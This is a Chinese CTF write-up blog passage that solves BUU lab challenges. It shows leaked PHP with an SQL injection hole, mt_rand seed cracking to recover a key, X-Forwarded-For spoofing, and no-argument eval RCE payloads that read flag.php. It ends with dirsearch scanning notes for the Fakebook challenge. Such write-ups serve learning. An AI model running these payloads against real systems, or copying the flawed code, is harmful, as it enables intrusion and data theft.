<h4 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h4><p>dirsearch扫一下，有源码泄露：<a href="http://www.zip/">www.zip</a></p>
<p>下载下来得到index.php的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    $username = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    $password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    $Private_key = $_POST[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (($username == <span class="hljs-string">&#x27;&#x27;</span>) || ($password == <span class="hljs-string">&#x27;&#x27;</span>) ||($Private_key == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($Private_key != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>($Private_key === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        $getuser = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        $link=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,$link);<br>        $result = mysql_query($getuser);<br>        <span class="hljs-keyword">while</span>($row=mysql_fetch_assoc($result))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-comment">// genarate public_key </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>) </span>&#123;<br>    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )<br>    $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> $public_key;<br>  &#125;<br><br>  <span class="hljs-comment">//genarate private_key</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>) </span>&#123;<br>    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )<br>    $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> $private_key;<br>  &#125;<br>  $Public_key = public_key();<br>  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></code></pre></td></tr></table></figure>

<p>代码里告诉了我们一个页面：login.html</p>
<p>访问看一下：</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929161956786.png" alt="image-20210929161956786"></p>
<p>分析了一下代码</p>
<p>用户名和密码、私钥都不能为空</p>
<p>按照第三段判断，</p>
<p>用户名为crispr，密码那里可以看到很明显的单引号SQL注入漏洞</p>
<p>难的就是私钥啊啊啊</p>
<h4 id="直接借用Y1ng大佬的过程"><a href="#直接借用Y1ng大佬的过程" class="headerlink" title="直接借用Y1ng大佬的过程"></a>直接借用Y1ng大佬的过程</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *str1 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br>    <span class="hljs-keyword">char</span> *str2 = <span class="hljs-string">&quot;KVQP0LdJKRaV3n9D&quot;</span>; <span class="hljs-comment">//公钥</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(str2) ; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-built_in">strlen</span>(str1) ; j++) &#123;<br>            <span class="hljs-keyword">if</span> ( str2[i] == str1[j] ) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d 0 %d &quot;</span>, j, j, <span class="hljs-built_in">strlen</span>(str1)<span class="hljs-number">-1</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/28/2021/buu/24/image-20210929162312335.png" alt="image-20210929162312335"></p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929162350213.png" alt="image-20210929162350213"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">1775196155</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>) </span>&#123;<br>    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )<br>    $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> $public_key;<br>&#125;<br><br><span class="hljs-comment">//genarate private_key</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>) </span>&#123;<br>    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )<br>    $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> $private_key;<br>&#125;<br>$Public_key = public_key();<br>$y1ng = private_key();<br><span class="hljs-keyword">echo</span> $Public_key . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> $y1ng;<br></code></pre></td></tr></table></figure>

<p>得到私钥：XuNhoueCDCGc</p>
<p>有了这个，嘿嘿嘿，可以为所欲为了（不是）</p>
<h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p>万能密码走起</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929162457871.png" alt="image-20210929162457871"></p>
<p>登录后：</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929162522508.png" alt="image-20210929162522508"></p>
<h2 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h2><p>啊，这题感觉有点小无语</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929163657423.png" alt="image-20210929163657423"></p>
<p>进去之后发现被出题人疯狂嘲讽</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929163738713.png" alt="image-20210929163738713"></p>
<p>扫这个就被嘲讽还想py？</p>
<h4 id="md5失败"><a href="#md5失败" class="headerlink" title="md5失败"></a>md5失败</h4><p>老老实实回去页面</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929163835193.png" alt="image-20210929163835193"></p>
<p>源码里看到这段代码</p>
<p>我试了半天的md5加密，结果wp和我说这，是，解，不，出，来，的！</p>
<p>直接访问/flag.php就可以了（不争气的泪水流了下来）</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929164028325.png" alt="image-20210929164028325"></p>
<p>然后就是这个帅气的表情包</p>
<p>到这边完全没有思路</p>
<h4 id="大佬的解题"><a href="#大佬的解题" class="headerlink" title="大佬的解题"></a>大佬的解题</h4><p>Y1ng大佬说是去看js文件</p>
<p>发现lib/php-mail-form/validate.js中的 JQuery 会发一个 POST 请求</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">var action = $(this).attr(<span class="hljs-string">&#x27;action&#x27;</span>);<br>    <span class="hljs-keyword">if</span>( ! action ) &#123;<br>      action = <span class="hljs-string">&#x27;contactform/contactform.php&#x27;</span>;<br>    &#125;<br>    <br>    var this_form = $(this);<br>    this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.sent-message&#x27;</span>).slideUp();<br>    this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.error-message&#x27;</span>).slideUp();<br>    this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.loading&#x27;</span>).slideDown();<br>    $.ajax(&#123;<br>      type: <span class="hljs-string">&quot;POST&quot;</span>,<br>      url: action,<br>      data: str,<br>      success: function(msg) &#123;<br>        <span class="hljs-keyword">if</span> (msg == <span class="hljs-string">&#x27;OK&#x27;</span>) &#123;<br>          this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.loading&#x27;</span>).slideUp();<br>          this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.sent-message&#x27;</span>).slideDown();<br>          this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&quot;input, textarea&quot;</span>).val(<span class="hljs-string">&#x27;&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.loading&#x27;</span>).slideUp();<br>          this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.error-message&#x27;</span>).slideDown().html(msg);<br>        &#125;<br>      &#125;<br>    &#125;);<br></code></pre></td></tr></table></figure>

<p>但是请求的目标 contactform/contactform.php 是不存在的，怀疑出题人前段一键白嫖的时候没有仔细检查。</p>
<p>访问 flag.php 告诉还没买，已经记录了购买者的 ip</p>
<p>分析代码可知前段那个授权码验证肯定是无效的（就算验证通过后端也不知道），所以购买 flag 肯定是假的。因为记录了购买者的 ip，所以 XFF 伪造一下，得到 flag</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929164307294.png" alt="image-20210929164307294"></p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929164320367.png" alt="image-20210929164320367"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 禁止套娃</title>
    <url>/2021/08/01/2021/buu/5/</url>
    <content><![CDATA[<p> 知识点：命令执行绕过</p>
<p>靶机启动：</p>
<p><img src="/2021/08/01/2021/buu/5/image-20210801193338875.png" alt="image-20210801193338875"></p>
<p>查看了源码无果，又试了一下index.php、robots协议之类的也不行，御剑没有扫描出来</p>
<p>查看了wp才知道这是git泄露。</p>
<h3 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h3><h4 id="简述-git文件导致的源码泄露"><a href="#简述-git文件导致的源码泄露" class="headerlink" title="简述.git文件导致的源码泄露"></a>简述.git文件导致的源码泄露</h4><p>.git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。</p>
<h4 id="原理利用"><a href="#原理利用" class="headerlink" title="原理利用"></a>原理利用</h4><p>1、通常开发人员在开发时，通常将源码提交到远程的托管网站（如Github）方便管理与交互，等到开发最后阶段，再将源码从远程服务器上下载到 web 目录下， 如果开发人员忘记将其中的 .git文件删除，则可以通过 .git文件恢复网站源码，来获取一些敏感信息；<br>2、开发人员对站点使用 Git 对版本进行控制，实现自动部署，如果配置不当，直接将 .git文件加载到线上环境，这样便引起了.git文件泄露。</p>
<p>这时候我们用了名为GitHack的工具</p>
<p>(需要python版本为2打头的，因为作者写的时候估计python解释器是参考python2的所以用python3会报错,下载地址为：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</p>
<p>进行了扫描，获取源文件：</p>
<p><img src="/2021/08/01/2021/buu/5/image-20210801194006477.png" alt="image-20210801194006477"></p>
<p><img src="/2021/08/01/2021/buu/5/image-20210801194541670.png" alt="image-20210801194541670"></p>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们的最终目的就是绕过之后通过eval函数来查询flag。</p>
<p>源码分析：</p>
<ul>
<li>需要通过<strong>GET</strong>方式传入参数<code>exp</code></li>
<li>第一层<code>preg_match()</code>函数限制了php伪协议，像封装协议之类的</li>
<li>第二层<code>preg_replace()</code>正则表达式匹配，<code>(?R)</code>表示引用当前表达式，只能匹配通过无参数的函数。</li>
<li>第三层<code>preg_match()</code>限制了一些关键字</li>
<li><code>@eval($_GET[&#39;exp&#39;]);</code>可以进行命令执行；典型的无参数RCE</li>
<li>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</li>
</ul>
<p><img src="/2021/08/01/2021/buu/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>第二层正则表达式无法给directory参数赋值，所以查找能够返回为’.’结果的函数；</p>
<p>首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>并且scandir返回的是一个数组</p>
<p>那么问题就是如何构造<br>scandir(‘.’)</p>
<p>这里再看函数：</p>
<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>current() 返回数组中的当前单元, 默认取第一个值。<br>pos()是 current() 的别名。<br>这里还有一个知识点：</p>
<p><strong>current(localeconv())永远都是个点</strong></p>
<p>构造：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">current</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span><br>print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/01/2021/buu/5/image-20210801200909285.png" alt="image-20210801200909285"></p>
<p>到这里我们也只是可以知道flag.php的存在</p>
<p>却还不能读取它的源码</p>
<p><img src="/2021/08/01/2021/buu/5/1625650-20200204202458447-503722062.png" alt="img"></p>
<p>从上图的官方解释中可以知道</p>
<p>我们无法用单独的函数读取源码</p>
<p><strong>1.array_reverse()</strong><br>以相反的元素顺序返回数组</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));<br></code></pre></td></tr></table></figure>

<p><strong>2.array_flip()</strong></p>
<p>交换数组的键和值</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));<br></code></pre></td></tr></table></figure>

<p><strong>3.array_rand()</strong></p>
<p>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br></code></pre></td></tr></table></figure>

<p>不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">exp=print_r(<span class="hljs-name">readfile</span>(<span class="hljs-name">next</span>(<span class="hljs-name">array_reverse</span>(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">exp=highlight_file(<span class="hljs-name">next</span>(<span class="hljs-name">array_reverse</span>(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">exp=show_source(<span class="hljs-name">session_id</span>(<span class="hljs-name">session_start</span>()))<span class="hljs-comment">;    </span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/01/2021/buu/5/image-20210801202551668.png" alt="image-20210801202551668"></p>
<p>参考博客：</p>
<p> <a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p>
<p> <a href="https://blog.csdn.net/weixin_44037296/article/details/111404335">GXYCTF2019] 禁止套娃_Senimo-CSDN博客_buuctf 禁止套娃</a></p>
<p> <a href="https://blog.csdn.net/rfrder/article/details/109627827">GXYCTF2019]禁止套娃 1_feng的博客-CSDN博客</a></p>
<h4 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h4><p>学长用这题做模板，做了改造题</p>
<p>本来以为很简单(好吧其实是很简单)</p>
<p>先用</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">current</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>



<p><img src="/2021/08/01/2021/buu/5/image-20210827201807385.png" alt="image-20210827201807385"></p>
<p>再直接读取（我就是傻傻一直不读读取的孩子啊，在那array_reverse，哭死了）</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><code class="hljs ceylon">show<span class="hljs-number">_</span>source(<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>real<span class="hljs-number">_f</span>lag);<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/01/2021/buu/5/image-20210827201914618.png" alt="image-20210827201914618"></p>
]]></content>
      <categories>
        <category>CTF·rce</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2018 Fakebook</title>
    <url>/2021/08/02/2021/buu/6/</url>
    <content><![CDATA[<h4 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h4><p>先纪念一下啊，调试了好长一段时间才成功的扫描工具<strong>dirsearch</strong></p>
<p>总结运行成功的几个条件：</p>
<p>1.安装python版本3.7及以上，且要确保cmd命令行内默认版本正确（因为之前我为了使用GitHack而更改了python解释器）。</p>
<p>2.遇到如下报错时：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\dirsearch.py&quot;</span>, line <span class="hljs-number">28</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> lib.controller.controller <span class="hljs-keyword">import</span> Controller<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\controller\__init__.py&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> .controller <span class="hljs-keyword">import</span> Controller  <span class="hljs-comment"># noqa: F401</span><br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\controller\controller.py&quot;</span>, line <span class="hljs-number">29</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> lib.connection.requester <span class="hljs-keyword">import</span> Requester<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\connection\requester.py&quot;</span>, line <span class="hljs-number">30</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> thirdparty.requests_ntlm <span class="hljs-keyword">import</span> HttpNtlmAuth<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\thirdparty\requests_ntlm\__init__.py&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> .requests_ntlm <span class="hljs-keyword">import</span> HttpNtlmAuth<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\thirdparty\requests_ntlm\requests_ntlm.py&quot;</span>, line <span class="hljs-number">5</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> cryptography <span class="hljs-keyword">import</span> x509<br>ModuleNotFoundError: <span class="hljs-keyword">No</span> <span class="hljs-keyword">module</span> named <span class="hljs-string">&#x27;cryptography&#x27;</span><br></code></pre></td></tr></table></figure>

<p>说明库没装上，可以去pycharm里自行安装完整。</p>
<p>附上图:</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210802195925831.png"></p>
<p><img src="/2021/08/02/2021/buu/6/image-20210802200037618.png"></p>
<p><img src="/2021/08/02/2021/buu/6/image-20210802200638164.png"></p>
<p>dirseach自带的字典在db目录下，使用格式以及常用参数如下：<br>py dirsearch.py<code>-</code>u [target url]<code>-</code>e<code>*</code></p>
<p><strong>-<code>u后面跟要扫的url</code></strong></p>
<p><strong>-<code>e是指定的url</code></strong></p>
<p><strong>-<code>w是指定字典</code></strong></p>
<p><strong>-<code>r递归目录</code></strong></p>
<p><strong>-<code>random</code>-agents使用随机UA</strong></p>
<p>还可以调低线程：dirsearch.py -u url -e * –timeout=2 -t 1 -x 400,403,404,500,503,429</p>
<hr>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>打开后注册（join）进入·页面</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210803144611777.png" alt="image-20210803144611777"></p>
<p>点击后</p>
<p>发现了注入点：</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210803144818019.png" alt="image-20210803144818019"></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">**Notice**:  unserialize(): Error <span class="hljs-keyword">at</span> <span class="hljs-built_in">offset</span> <span class="hljs-number">0</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">in</span> **/var/www/html/view.php** <span class="hljs-keyword">on</span> <span class="hljs-title">line</span> **<span class="hljs-title">31</span>**<br></code></pre></td></tr></table></figure>

<p>页面左上方提示了本题实际与序列化有关</p>
<p>查看wp知道了要用dirsearch扫描目录获取源文件</p>
<p>如下图状态码回响200时，出现了robots协议</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210802200638164.png" alt="image-20210802200638164"></p>
<p>按照提示访问下载user.php.bak</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210802200728401.png" alt="image-20210802200728401"></p>
<p>重命名为user.php,源打开代码：</p>
<p><img src="/2021/08/02/2021/buu/6/image-20210802200825525.png" alt="image-20210802200825525"></p>
<h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p><img src="/2021/08/02/2021/buu/6/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="摘抄："><a href="#摘抄：" class="headerlink" title="摘抄："></a>摘抄：</h5><p>*<em>【</em>】curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。**</p>
<p>*<em>【</em>】curl_setopt ： 请求一个url。**<br><strong>其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。</strong></p>
<p>*<em>【</em>】CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。**</p>
<p>*<em>【</em>】curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。**</p>
